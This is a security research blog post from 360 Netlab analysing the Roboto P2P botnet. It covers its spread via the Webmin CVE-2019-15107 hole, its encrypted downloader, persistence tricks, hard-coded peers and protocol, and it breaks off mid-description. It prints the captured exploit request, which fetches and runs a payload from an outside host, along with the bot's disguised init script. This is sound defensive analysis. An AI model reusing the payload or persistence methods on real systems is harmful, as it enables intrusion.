<!DOCTYPE html>
<html lang="en">
<head>

    <title>The awaiting Roboto Botnet</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=2cbc1d8e23" />

    <link rel="icon" href="https://blog.netlab.360.com/content/images/size/w256h256/2019/02/netlab_xs-2.png" type="image/png">
    <link rel="canonical" href="https://blog.netlab.360.com/the-awaiting-roboto-botnet-en/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="amphtml" href="https://blog.netlab.360.com/the-awaiting-roboto-botnet-en/amp/">
    
    <meta property="og:site_name" content="360 Netlab Blog - Network Security Research Lab at 360">
    <meta property="og:type" content="article">
    <meta property="og:title" content="The awaiting Roboto Botnet">
    <meta property="og:description" content="Background introduction


On August 26, 2019, our 360Netlab Unknown Threat Detection System highlighted a suspicious ELF file (4cd7bcd0960a69500aa80f32762d72bc) and passed along to our researchers to take a closer look, upon further analysis, we determined it is a P2P bot program.


Fast forwarded to October 11, 2019, our Anglerfish honeypot captured">
    <meta property="og:url" content="https://blog.netlab.360.com/the-awaiting-roboto-botnet-en/">
    <meta property="og:image" content="https://blog.netlab.360.com/content/images/2019/02/astronomy-constellation-dark-998641-4.jpg">
    <meta property="article:published_time" content="2019-11-20T14:00:00.000Z">
    <meta property="article:modified_time" content="2022-02-09T07:10:37.000Z">
    <meta property="article:tag" content="Roboto">
    <meta property="article:tag" content="en">
    <meta property="article:tag" content="P2P">
    <meta property="article:tag" content="Botnet">
    <meta property="article:tag" content="Webmin">
    <meta property="article:tag" content="CVE-2019-15107">
    <meta property="article:tag" content="honeypot">
    <meta property="article:tag" content="Import 2022-11-30 11:16">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="The awaiting Roboto Botnet">
    <meta name="twitter:description" content="Background introduction


On August 26, 2019, our 360Netlab Unknown Threat Detection System highlighted a suspicious ELF file (4cd7bcd0960a69500aa80f32762d72bc) and passed along to our researchers to take a closer look, upon further analysis, we determined it is a P2P bot program.


Fast forwarded to October 11, 2019, our Anglerfish honeypot captured">
    <meta name="twitter:url" content="https://blog.netlab.360.com/the-awaiting-roboto-botnet-en/">
    <meta name="twitter:image" content="https://blog.netlab.360.com/content/images/2019/02/astronomy-constellation-dark-998641-4.jpg">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="Alex.Turing">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="Roboto, en, P2P, Botnet, Webmin, CVE-2019-15107, honeypot, Import 2022-11-30 11:16">
    <meta name="twitter:site" content="@360Netlab">
    <meta name="twitter:creator" content="@TuringAlex">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="800">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "360 Netlab Blog - Network Security Research Lab at 360",
        "url": "https://blog.netlab.360.com/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://blog.netlab.360.com/content/images/2019/02/netlab-brand-5.png"
        }
    },
    "author": {
        "@type": "Person",
        "name": "Alex.Turing",
        "image": {
            "@type": "ImageObject",
            "url": "https://blog.netlab.360.com/content/images/2019/06/turing.PNG",
            "width": 1200,
            "height": 1200
        },
        "url": "https://blog.netlab.360.com/author/alex/",
        "sameAs": [
            "https://twitter.com/TuringAlex"
        ]
    },
    "headline": "The awaiting Roboto Botnet",
    "url": "https://blog.netlab.360.com/the-awaiting-roboto-botnet-en/",
    "datePublished": "2019-11-20T14:00:00.000Z",
    "dateModified": "2022-02-09T07:10:37.000Z",
    "keywords": "Roboto, en, P2P, Botnet, Webmin, CVE-2019-15107, honeypot, Import 2022-11-30 11:16",
    "description": "Background introduction\n\n\nOn August 26, 2019, our 360Netlab Unknown Threat Detection System highlighted a suspicious ELF file (4cd7bcd0960a69500aa80f32762d72bc) and passed along to our researchers to take a closer look, upon further analysis, we determined it is a P2P bot program.\n\n\nFast forwarded to October 11, 2019, our Anglerfish honeypot captured another suspicious ELF sample (4b98096736e94693e2dc5a1361e1a720), and it turned out to be the Downloader of the previous suspicious ELF sample. The",
    "mainEntityOfPage": "https://blog.netlab.360.com/the-awaiting-roboto-botnet-en/"
}
    </script>

    <meta name="generator" content="Ghost 5.76">
    <link rel="alternate" type="application/rss+xml" title="360 Netlab Blog - Network Security Research Lab at 360" href="https://blog.netlab.360.com/rss/">
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="db8c743e6bb1457403d255d83f" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://blog.netlab.360.com/" crossorigin="anonymous"></script>
    
    <link href="https://blog.netlab.360.com/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=2cbc1d8e23"></script>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=2cbc1d8e23">
    <style type='text/css'>
	#ghost-portal-root {
        display: none;
    }
</style><style>:root {--ghost-accent-color: #eca265;}</style>

</head>
<body class="post-template tag-roboto tag-en tag-p2p tag-botnet tag-webmin tag-cve-2019-15107 tag-honeypot tag-import-2022-11-30-11-16 has-cover">
<div class="viewport">

    <header id="gh-head" class="gh-head outer">
        <nav class="gh-head-inner inner">

            <div class="gh-head-brand">
                <a class="gh-head-logo" href="https://blog.netlab.360.com">
                        <img src="https://blog.netlab.360.com/content/images/2019/02/netlab-brand-5.png" alt="360 Netlab Blog - Network Security Research Lab at 360" />
                </a>
                <div class="gh-head-brand-wrapper">
                    <button class="gh-search" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                    <a class="gh-burger" role="button">
                        <div class="gh-burger-box">
                            <div class="gh-burger-inner"></div>
                        </div>
                    </a>
                </div>
            </div>
            <div class="gh-head-menu">
                <ul class="nav">
    <li class="nav-botnet"><a href="https://blog.netlab.360.com/tag/botnet/">Botnet</a></li>
    <li class="nav-dnsmon"><a href="https://blog.netlab.360.com/tag/dnsmon/">DNSMon</a></li>
    <li class="nav-ddos"><a href="https://blog.netlab.360.com/tag/ddos/">DDoS</a></li>
    <li class="nav-passivedns"><a href="https://blog.netlab.360.com/tag/pdns/">PassiveDNS</a></li>
    <li class="nav-mirai"><a href="https://blog.netlab.360.com/tag/mirai/">Mirai</a></li>
    <li class="nav-dta"><a href="https://blog.netlab.360.com/tag/dta/">DTA</a></li>
</ul>

            </div>
            <div class="gh-head-actions">
                <div class="gh-social">
                        <a class="gh-social-link gh-social-twitter" href="https://twitter.com/360Netlab" title="Twitter" target="_blank" rel="me noopener"><svg class="icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg></a>
                        <a class="gh-social-link gh-social-feedly" href="https://feedly.com/i/subscription/feed/https://blog.netlab.360.com/rss/" title="RSS" target="_blank" rel="me noopener"><svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><circle cx="6.18" cy="17.82" r="2.18"/><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/></svg>
</a>
                </div>
            </div>
        </nav>
    </header>

    <div class="site-content">
             <div class="floating-header">
    <div class="floating-header-logo">
        <a href="https://blog.netlab.360.com">
                <img src="/content/images/size/w30/2019/02/netlab_xs-2.png" alt="360 Netlab Blog - Network Security Research Lab at 360 icon" />
            <span>360 Netlab Blog - Network Security Research Lab at 360</span>
        </a>
    </div>
    <span class="floating-header-divider">&mdash;</span>
    <div class="floating-header-title">The awaiting Roboto Botnet</div>
    <div class="floating-header-share">
        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"/>
</svg>
</div>
        <a class="floating-header-share-tw" href="https://twitter.com/share?text=The%20awaiting%20Roboto%20Botnet&amp;url=https://blog.netlab.360.com/the-awaiting-roboto-botnet-en/"
            onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
            <svg class="icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg>        </a>
        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.netlab.360.com/the-awaiting-roboto-botnet-en/"
            onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
            <svg class="icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path d="M23.9981 11.9991C23.9981 5.37216 18.626 0 11.9991 0C5.37216 0 0 5.37216 0 11.9991C0 17.9882 4.38789 22.9522 10.1242 23.8524V15.4676H7.07758V11.9991H10.1242V9.35553C10.1242 6.34826 11.9156 4.68714 14.6564 4.68714C15.9692 4.68714 17.3424 4.92149 17.3424 4.92149V7.87439H15.8294C14.3388 7.87439 13.8739 8.79933 13.8739 9.74824V11.9991H17.2018L16.6698 15.4676H13.8739V23.8524C19.6103 22.9522 23.9981 17.9882 23.9981 11.9991Z"/></svg>        </a>
    </div>
    <progress id="reading-progress" class="progress" value="0">
        <div class="progress-container">
            <span class="progress-bar"></span>
        </div>
    </progress>
</div>


  <main id="site-main" class="site-main">
    <article class="article post tag-roboto tag-en tag-p2p tag-botnet tag-webmin tag-cve-2019-15107 tag-honeypot tag-import-2022-11-30-11-16 no-image ">

      <header class="article-header gh-canvas">

        <div class="article-tag post-card-tags">
          <span class="post-card-primary-tag">
            <a href="/tag/roboto/">Roboto</a>
          </span>
        </div>

        <h1 class="article-title">The awaiting Roboto Botnet</h1>


        <div class="article-byline">
          <section class="article-byline-content">

            <ul class="author-list">
              <li class="author-list-item">
                <a href="/author/alex/" class="author-avatar">
                  <img class="author-profile-image" src="/content/images/2019/06/turing.PNG" alt="Alex.Turing" />
                </a>
              </li>
              <li class="author-list-item">
                <a href="/author/yegenshen/" class="author-avatar">
                  <img class="author-profile-image" src="/content/images/2017/10/1662072805.jpg" alt="Genshen Ye" />
                </a>
              </li>
            </ul>

            <div class="article-byline-meta">
              <h4 class="author-name"><a href="/author/alex/">Alex.Turing</a>, <a href="/author/yegenshen/">Genshen Ye</a></h4>
              <div class="byline-meta-content">
                <time class="byline-meta-date" datetime=" 2019-11-20">Nov 20, 2019</time>
                <span class="byline-reading-time"><span class="bull">&bull;</span> 12 min read</span>
              </div>
            </div>

          </section>
        </div>


      </header>

      <section class="gh-content gh-canvas">
        <!--kg-card-begin: markdown--><h2 id="backgroundintroduction">Background introduction</h2>
<p>On August 26, 2019, our 360Netlab Unknown Threat Detection System highlighted a suspicious ELF file (4cd7bcd0960a69500aa80f32762d72bc) and passed along to our researchers to take a closer look, upon further analysis, we determined it is a P2P bot program.</p>
<p>Fast forwarded to October 11, 2019, our Anglerfish honeypot captured another suspicious ELF sample (4b98096736e94693e2dc5a1361e1a720), and it turned out to be the Downloader of the previous suspicious ELF sample. The Downloader sample downloads the above Bot program from two hard-coded HTTP URLs. One of the addresses disguised the Bot sample as a Google font library &quot;roboto.ttc&quot;, so we named the Botnet Roboto.</p>
<p>We have been tracking the Roboto Botnet for nearly three months and here are some of its technical features.</p>
<h2 id="robotobotnetoverview">Roboto Botnet overview</h2>
<p>Currently, we have captured the Downloader and Bot modules of the Roboto Botnet, and we speculate that it also has a vulnerability scanning module and a P2P control module.<br>
<a href="https://blog.netlab.360.com/content/images/2019/11/Roboto.png"><img src="https://blog.netlab.360.com/content/images/2019/11/Roboto.png" class="kg-image"></a><br>
Roboto Botnet mainly supports 7 functions: reverse shell, self-uninstall, gather process' network information, gather Bot information, execute system commands, run encrypted files specified in URLs, DDoS attack, etc.</p>
<p>At the same time, it also uses Curve25519, Ed25519, TEA, SHA256, HMAC-SHA256 and other algorithms to ensure the integrity and security of its components and P2P network, create the corresponding Linux self-starting script based on the target system, and disguise its own files and processes name to gain persistence control.</p>
<p>Roboto Botnet has DDoS functionality, but it seems DDoS is not its main goal. We have yet to captured a single DDoS attack command since it showed up on our radar. We still yet to learn its true purpose.</p>
<h2 id="propagation">Propagation</h2>
<p>On October 11th, 2019, the Anglerfish honeypot caught <code>51.38.200.230</code>spreading Downloader sample <code>4b98096736e94693e2dc5a1361e1a720</code> via the Webmin RCE vulnerability (CVE-2019-15107) . The download URL is <code>http://190.114.240.194/boot</code>, the following is the exploit Payload.</p>
<pre><code>POST /password_change.cgi HTTP/1.1
Host: {target}:10000
User-Agent: Go-http-client/1.1
Accept: */*
Referer: https://{target}:10000/session_login.cgi
Cookie: redirect=1; testing=1; sid=x; sessiontest=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 270

user=daemon&amp;pam=&amp;new1=x&amp;new2=x&amp;old=x%7Cwget%20190.114.240.194%2Fboot%20-O%20%2Ftmp%2F93b5b5e8%3Bchmod%20777%20%2Ftmp%2F93b5b5e8%3B%2Ftmp%2F93b5b5e8%26&amp;expired=wget%20190.114.240.194%2Fboot%20-O%20%2Ftmp%2F93b5b5e8%3Bchmod%20777%20%2Ftmp%2F93b5b5e8%3B%2Ftmp%2F93b5b5e8%26%  
</code></pre>
<p>We can see that <code>51.38.200.230</code> itself also has the same Webmin service (TCP/10000) open, guess it was also infected.</p>
<h2 id="reverseanalysis">Reverse analysis</h2>
<h3 id="robotodownloadersampleanalysis">Roboto Downloadersample analysis</h3>
<ul>
<li>MD5: 4b98096736e94693e2dc5a1361e1a720</li>
</ul>
<blockquote>
<p>ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped<br>
Library: musl-libc</p>
</blockquote>
<p>The main function of Roboto Downloader is to download the corresponding encrypted Roboto Bot program from the specified URL according to the CPU architecture of the victim machine, and then decrypt and execute it.</p>
<p>Currently, Roboto Downloader supports both i386 and x86_64 architectures.<br>
<a href="https://blog.netlab.360.com/content/images/2019/11/rob_arch.png"><img src="https://blog.netlab.360.com/content/images/2019/11/rob_arch.png" class="kg-image"></a></p>
<p>The Roboto Downloader sample hard-coded URL stores the encrypted Roboto Bot program. Each group of URLs has a corresponding decryption key and SHA256 check value.<br>
<a href="https://blog.netlab.360.com/content/images/2019/11/rob_res_2.png"><img src="https://blog.netlab.360.com/content/images/2019/11/rob_res_2.png" class="kg-image"></a></p>
<p>Take image2.jpg as an example. Its SHA256 hash value is consistent with the hard-coded SHA256 hash value in the Roboto Downloader sample.<br>
<a href="https://blog.netlab.360.com/content/images/2019/11/rob_res_sha256.png"><img src="https://blog.netlab.360.com/content/images/2019/11/rob_res_sha256.png" class="kg-image"></a></p>
<p>The decryption algorithm is as follows, the Key length is 8 bytes, and each round will calculate a new XOR Key.<br>
<a href="https://blog.netlab.360.com/content/images/2019/11/rob_xor.png"><img src="https://blog.netlab.360.com/content/images/2019/11/rob_xor.png" class="kg-image"></a></p>
<p>After decrypting, we got the Roboto Bot sample.<br>
<a href="https://blog.netlab.360.com/content/images/2019/11/rob_dec.png"><img src="https://blog.netlab.360.com/content/images/2019/11/rob_dec.png" class="kg-image"></a></p>
<p>The initial XOR Key is not known, but the characteristics of the XOR encryption algorithm can be used to get the bot file.<br>
According to the feature that the value of elf_header[0x8:0xf] is often 0, the Bot file can be decrypted by the following method.</p>
<pre><code class="language-c++">	fstream file(filename, ios::binary | ios::in);
	file.read((char*)fstr.data(), fsize);
	file.close();
	string skey(fstr, 8, 8);
	reverse(skey.begin(), skey.end());
	uint64_t *sskey = (uint64_t*)&amp;skey[0];
	cout &lt;&lt; hex &lt;&lt; &quot;sskey= &quot; &lt;&lt; *sskey &lt;&lt; endl;
	fstr[0] = '\x7F';
	fstr[1] = 'E';
	fstr[2] = 'L';
	fstr[3] = 'F';
	fstr[6] = '\x01';
	fstr[7] = '\x00';
	fsize -= 8;
	uint64_t cnt = fsize / 8;
	uint8_t rmd = fsize % 8;
	for (uint64_t i = 0; i &lt; cnt; i++) {
		for (int j = 0; j &lt; 8; j++)
		{
			fstr[8 + i * 8 + j] ^= *((uint8_t*)sskey + 7 - j);
		}
		uint64_t rnda = *sskey &lt;&lt; 13 ^ *sskey;
		uint64_t rndb = rnda &gt;&gt; 7 ^ rnda;
		uint64_t rndc = rndb &lt;&lt; 17 ^ rndb;
		*sskey = rndc;
	}
	for (uint8_t i = 0; i &lt; rmd; i++)
	{
		fstr[8 * cnt + 8 + i] ^= *((uint8_t*)sskey + rmd - i);
	}
	if (fstr[42] == '\x20' &amp;&amp; fstr[46] == '\x28')
	{
		fstr[4] = '\x01';
		fstr[5] = '\x01';
	}
	if (fstr[43] == '\x20' &amp;&amp; fstr[47] == '\x28')
	{
		fstr[4] = '\x01';
		fstr[5] = '\x02';
	}
	if (fstr[54] == '\x38' &amp;&amp; fstr[58] == '\x40')
	{
		fstr[4] = '\x02';
		fstr[5] = '\x01';
	}
	if (fstr[55] == '\x38' &amp;&amp; fstr[59] == '\x40')
	{
		fstr[4] = '\x02';
		fstr[5] = '\x02';
	}
</code></pre>
<h3 id="robotobotsampleanalysis">Roboto Bot sample analysis</h3>
<ul>
<li>MD5: d88c737b46f1dcb981b4bb06a3caf4d7</li>
</ul>
<blockquote>
<p>ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped<br>
Library: musl-libc</p>
</blockquote>
<p>As aforementioned, Roboto Bot has server build in functions and disguise itself on the victim host.</p>
<h4 id="disguise">Disguise</h4>
<ul>
<li>
<p>Create self-starting script based on the release version of the Linux system <code>/etc/init.d/dns-clear</code> or <code>systemd-hwdb-upgrade.service</code></p>
<pre><code>#! /bin/sh

### BEGIN INIT INFO
# Provides:          dns-clear
# Required-Start:    $local_fs $remote_fs $network
# Required-Stop:     $local_fs
# Default-Start:     1 2 3 4 5
# Default-Stop:
# Short-Description: Cleans up any mess left by 0dns-up
### END INIT INFO

PATH=/sbin:/bin:/usr/sbin:/usr/bin

case &quot;$1&quot; in
  start)
        /usr/lib/libXxf86dag.so.1.0.0 &amp;
        ;;
  *)
        ;;
esac

exit 0
</code></pre>
</li>
<li>
<p>Fake Process names</p>
<pre><code>(sd-pam)
/sbin/rpcbind
/usr/bin/python
upstart-socket-bridge
/usr/sbin/irqbalance
/lib/systemd/systemd-udevd
/usr/libexec/postfix/master
</code></pre>
</li>
<li>
<p>File name for masquerading</p>
<pre><code>libXxf86dag.so
.node_repl_history.gz
</code></pre>
</li>
</ul>
<h4 id="hardcodedpeerinformation">Hard coded Peer information</h4>
<p>Roboto Bot hardcoded 4 sets of Peers, the structure is <strong>IP: PORT: Curve25519_Pub Key</strong><br>
<a href="https://blog.netlab.360.com/content/images/2019/11/rob_c2.png"><img src="https://blog.netlab.360.com/content/images/2019/11/rob_c2.png" class="kg-image"></a></p>
<pre><code>Peer 1:
	213.159.27.5:57491
Pubkey:
	8E A5 64 E2 A5 F7 73 6D 2E F2 86 D3 7B B7 86 E4 
	7F 0D A7 A0 77 B1 AD 24 49 5B DE D6 DB B7 E1 79

Peer 2:
	186.46.45.252:52085
Pubkey:
	93 DA 64 B3 1F 49 1B A4 B5 2D 28 92 49 52 7C 3D 
	41 D2 4F B2 8B FF 2C ED A2 E7 90 18 4F 9E C0 7B

Peer 3:
	95.216.17.209:57935
Pubkey:
	E8 78 31 C6 55 9A 13 FC AB DB 75 9B A5 B1 D6 05 
	F2 3A 72 FF 04 B5 9F 7F 5A 8B 12 56 F2 CA 01 5E

Peer 4:
	120.150.43.45:49252
Pubkey:
	E7 30 7D 3C BC 93 4A EC ED D8 FD 9F B9 FE 93 B7 
	F3 53 B3 11 5D F7 C8 CA 0C F8 77 D1 34 CA 37 20
　
</code></pre>
<p>The third peer has the following modification in the sample <code>4cd7bcd0960a69500aa80f32762d72bc</code></p>
<pre><code>Peer 3:
	66.113.179.13:33543
Pubkey:
	B3 E5 B3 D6 E6 DE 7C 7D 79 40 A5 4F D9 B0 AC 7B 
	2D C6 CE 69 EF F3 C4 58 F2 98 A8 92 DF 92 9E 0E
</code></pre>
<h4 id="encryptionverfication">Encryption verfication</h4>
<p>Roboto Bot uses algorithms such as Curve25519, TEA, and HMAC-SHA256 to implement data encryption and validity verification. This method is widely been used in the generation of cfg files and data packets.</p>
<p>The general process is as shown<br>
<a href="https://blog.netlab.360.com/content/images/2019/11/rob_flow.png"><img src="https://blog.netlab.360.com/content/images/2019/11/rob_flow.png" class="kg-image"></a></p>
<p><strong>Curve25519_PrivateKey</strong> is generated by /dev/urandom.<br>
<a href="https://blog.netlab.360.com/content/images/2019/11/rob_priv.png"><img src="https://blog.netlab.360.com/content/images/2019/11/rob_priv.png" class="kg-image"></a></p>
<h4 id="cfgfile">cfg file</h4>
<p>Roboto Bot will store the generated cfg files in different file locations depending on the privilege it runs.</p>
<pre><code>$home/.config/trolltech.conf      //run as regular user
/etc/iproute2/rt_ksfield          //run as root
</code></pre>
<p>The cfg file contains the private key, the encrypted data, and the HMAC-SHA256 value of the encrypted data, which are updated every hour. The encrypted data is composed of Peer and Port information, and its structure  is <em>peer:length:data,pcfg:length:data</em>.<a href="https://blog.netlab.360.com/content/images/2019/11/rob_cfg.png"><img src="https://blog.netlab.360.com/content/images/2019/11/rob_cfg.png" class="kg-image"></a><br>
Cfg file decryption example</p>
<pre><code>The first 0x20 byte，Curve25519 private key
    68 F4 83 18 2C F2 80 3D D1 B3 FF 68 FB 35 3D E8 
    E6 C8 DB 0B 8E FC 73 7C 01 B3 6F 3F 1C 89 38 63
The last 0x20 byte，hmac-sha256 hash (0x20-0x165)
    1B 64 C4 FD 65 C0 95 9B 6F B1　D7 C1 75 31 DA 5A 
    01 EC E1 52 06 25 E9 7D A1 9B　57 E5 CA 67 2B D6
    
Encryption verification
1. Generate publicKey:
    52 25 27 87 F2 B2 F7 35 32 1F ED A7 6A 29 03 A8  
    3F A4 51 58 EF 53 F5 6F 28 99 01 8E 62 2C 4A 24

2. Using last 16 bytes, DWORD reverse，to be used as encryption key for TEA:
    58 51 A4 3F 6F F5 53 EF 8E 01 99 28 24 4A 2C 62

3. Using the above Key, to get XOR Key:
    First round: ED 16 FB 00 46 4F 94 99

4. XOR decryption，repeat step 4 on every 8 byte，to update XOR Key:
    Ciphertext: 9D 73 9E 72 76 4E DE 99
    Plaintext: peer\x30\x01\x4a\x00\x00
</code></pre>
<p>Therefore, we know that Peer has 0x130 bytes of information, and so on, the plaintext of the ciphertext (8E 3C 1F 93 B1 C9) is (pcfg\x04\x00).</p>
<h4 id="p2pcontrolmodule">P2P control module</h4>
<p>Roboto Bot can be controlled by a Unix domain socket. The bound path is <code>/tmp/.cs</code><br>
<a href="https://blog.netlab.360.com/content/images/2019/11/rob_unixpro.png"><img src="https://blog.netlab.360.com/content/images/2019/11/rob_unixpro.png" class="kg-image"></a></p>
<p>The following code starts the control process<br>
<a href="https://blog.netlab.360.com/content/images/2019/11/rob_csm.png"><img src="https://blog.netlab.360.com/content/images/2019/11/rob_csm.png" class="kg-image"></a></p>
<p>We did not find the relevant code to set the environment variable &quot;CS&quot; in the Roboto Bot sample, so we speculated that it is in the Roboto P2P control module. It starts a process, sets the environment to &quot;CS&quot;, and controls the Roboto Bot module through a Unix domain socket. then the P2P node becomes the control node in the Botonet P2P network.</p>
<p>We can get a good idea on the functions of the P2P control module through the Roboto Bot module, these function names are very intuitive.<br>
<a href="https://blog.netlab.360.com/content/images/2019/11/rob_domsock.png"><img src="https://blog.netlab.360.com/content/images/2019/11/rob_domsock.png" class="kg-image"></a></p>
<p>We tested some of the control commands by hijacking the Roboto Bot program. Here are some test results.</p>
<p><code>info</code> The command will display hard-coded information and public key information, including the <code>v17</code>, we suspect it is a program version number.<br>
<a href="https://blog.netlab.360.com/content/images/2019/11/rob_info.png"><img src="https://blog.netlab.360.com/content/images/2019/11/rob_info.png" class="kg-image"></a><br>
<code>peers</code> The command displays the P2P node information currently connected by Roboto Bot.<br>
<a href="https://blog.netlab.360.com/content/images/2019/11/rob_peerinfo.png"><img src="https://blog.netlab.360.com/content/images/2019/11/rob_peerinfo.png" class="kg-image"></a></p>
<h4 id="botfunction">Bot function</h4>
<ul>
<li>Reverse shell<br>
<a href="https://blog.netlab.360.com/content/images/2019/11/rob_shell.png"><img src="https://blog.netlab.360.com/content/images/2019/11/rob_shell.png" class="kg-image"></a></li>
<li>Self uninstall<br>
<a href="https://blog.netlab.360.com/content/images/2019/11/rob_clear-2.png"><img src="https://blog.netlab.360.com/content/images/2019/11/rob_clear-2.png" class="kg-image"></a></li>
<li>Execution system command<br>
<a href="https://blog.netlab.360.com/content/images/2019/11/rob_system.png"><img src="https://blog.netlab.360.com/content/images/2019/11/rob_system.png" class="kg-image"></a></li>
<li>Get process network information (traverse process list, get process, network and crontab file information) and upload it to the specified HTTP interface</li>
</ul>
<pre><code>/proc/%s/exe
/proc/%s/cmdline
/proc/net/tcp
/proc/net/udp
crontab
</code></pre>
<p><a href="https://blog.netlab.360.com/content/images/2019/11/rob_cinfo1.png"><img src="https://blog.netlab.360.com/content/images/2019/11/rob_cinfo1.png" class="kg-image"></a></p>
<ul>
<li>
<p>Get the Bot information and upload it to the specified HTTP interface.<br>
<a href="https://blog.netlab.360.com/content/images/2019/11/rob_cinfo3.png"><img src="https://blog.netlab.360.com/content/images/2019/11/rob_cinfo3.png" class="kg-image"></a></p>
</li>
<li>
<p>Run the encrypted file in the specified URL (similar to the Roboto Downloader function)<br>
<a href="https://blog.netlab.360.com/content/images/2019/11/rob_http.png"><img src="https://blog.netlab.360.com/content/images/2019/11/rob_http.png" class="kg-image"></a></p>
</li>
<li>
<p>The DDoS attack<br>
Depending on the running privilege it gets, Bot provides four DDoS attack methods: ICMP Flood, HTTP Flood, TCP Flood, and UDP Flood.<br>
<a href="https://blog.netlab.360.com/content/images/2019/11/rob_atk.png"><img src="https://blog.netlab.360.com/content/images/2019/11/rob_atk.png" class="kg-image"></a></p>
</li>
</ul>
<h4 id="p2pcommunicationprotocol">P2P communication protocol</h4>
<p>Besides using the P2P communication protocol, Roboto Bot employs algorithms such as Curve25519, TEA, and HMAC-SHA256 to ensure data integrity and security. The encrypted Key is derived from the Curve25519_SharedKey generated by the public key in the Bot and C2 information. The format of the packet is index(4 bytes):type(1 byte):data:hmac-sha256[0:0xf], so packets larger than 21 bytes contain valid information.</p>
<h6 id="p2pnodediscoverydataverification">P2P node discovery data verification</h6>
<p>The length of the request packet is a fixed 69 bytes, the data is not encrypted, and the content is the public key of the target Peer and the public key of the Bot. After receiving the Bot request packet, Peer establishes a connection with the Bot if it is consistent with its own public key, and then calculates the SharedKey through the public key. In the subsequent communication process, the message with valid information (length greater than 21 words) Section) will be encrypted.<br>
<a href="https://blog.netlab.360.com/content/images/2019/11/rob_hello.png"><img src="https://blog.netlab.360.com/content/images/2019/11/rob_hello.png" class="kg-image"></a></p>
<h6 id="p2pnodediscoverydatadecryption">P2P node discovery data decryption</h6>
<p>The local Petoto Bot sample is communicated with the hard-coded Peer (186.46.45.252), and a new Peer node 87.249.15.18:63104 is taken as an example.<br>
<a href="https://blog.netlab.360.com/content/images/2019/11/rob_hellosrv.png"><img src="https://blog.netlab.360.com/content/images/2019/11/rob_hellosrv.png" class="kg-image"></a><br>
Bot request, 69 bytes</p>
<pre><code>index: 00 00 00 00 
type: 2
data:
	 0-31: C2 Curve25519_PublicKey
